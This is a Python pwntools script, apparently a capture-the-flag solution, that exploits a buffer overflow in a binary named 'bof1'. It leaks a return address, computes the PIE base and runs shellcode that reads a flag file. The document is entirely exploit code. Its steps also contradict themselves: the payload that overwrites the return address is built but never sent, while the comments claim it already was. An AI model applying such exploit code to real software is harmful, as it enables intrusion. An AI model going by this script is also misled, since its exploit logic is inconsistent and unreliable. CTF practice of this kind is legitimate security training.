from pwn import *

context.binary = './bof1'
elf = context.binary
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

# start the process with seccomp disabled
p = process(elf.path, env={"NO_SANDBOX": "1"})

# Step 1: Send payload to leak return address (only 1 chance!)
leak_payload = b'A' * 56
p.sendafter("name? ", leak_payload)

# Step 2: Receive leaked return address
leaked = p.recvuntil(b"room number")
leaked_ret = leaked.split(b'Welcome, ')[1][:8]
print(f"leak ret: {leaked_ret}")

ret_addr = u64(leaked_ret.ljust(8, b'\x00'))
log.success(f"Leaked return address: {hex(ret_addr)}")

# Step 3: Compute PIE base and msg address
task_ret_offset = 313  # from GDB: task+313 is return
base_addr = ret_addr - task_ret_offset
msg_offset = 0xea7a7   # from: lea rax, [rip + 0xe5670] = offset to msg
msg_addr = base_addr + msg_offset
log.info(f"PIE base address: {hex(base_addr)}")
log.info(f"msg address: {hex(msg_addr)}")

# Step 4: Fill dummy data for buf2 and buf3
p.sendafter("room number? ", b'B\n')
p.sendafter("customer's name? ", b'C\n')

# Step 5: Send shellcode into RWX msg buffer
shellcode = asm(shellcraft.open("/FLAG"))
shellcode += asm(shellcraft.read(3, 'rsp', 100))
shellcode += asm(shellcraft.write(1, 'rsp', 100))

p.sendafter("Leave your message: ", shellcode)

# (task will return here, and jump to the overwritten return address)

# Step 6: Now overwrite RIP (already done above)
# Why this works: we sent it early via buf1, the only overflow point
overflow_payload = b'A' * 56 + p64(msg_addr)
# Re-execute the binary with the overflow payload preloaded
# We do this by restarting the process and sending the full exploit
# But since we already sent it in the first input, no need to send again

# Get flag output
p.interactive()

